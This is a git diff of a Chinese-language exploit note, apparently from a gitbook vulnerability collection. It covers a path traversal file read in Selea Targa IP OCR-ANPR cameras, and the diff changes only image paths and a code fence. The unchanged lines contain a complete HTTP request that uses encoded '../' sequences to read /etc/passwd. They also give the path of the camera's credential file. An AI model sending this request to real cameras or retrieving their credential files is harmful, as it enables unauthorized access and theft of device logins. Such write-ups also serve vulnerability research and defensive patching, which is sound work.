@@ -28,11 +28,11 @@ Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB
 
 登录页面如下
 
-![](images/202202140932431.png)
+![](../.gitbook/assets/202202140932431.png)
 
 发送如下请求包读取文件
 
-```plain
+```
 GET /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
 Host: 
 Upgrade-Insecure-Requests: 1
@@ -43,11 +43,8 @@ Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
 Connection: close
 ```
 
-![](images/202202140932589.png)
+![](../.gitbook/assets/202202140932589.png)
 
 摄像头账号密码文件为 **mnt/data/auth/users.json**
 
-![](images/202202140932748.png)
-
-
-
+![](../.gitbook/assets/202202140932748.png)
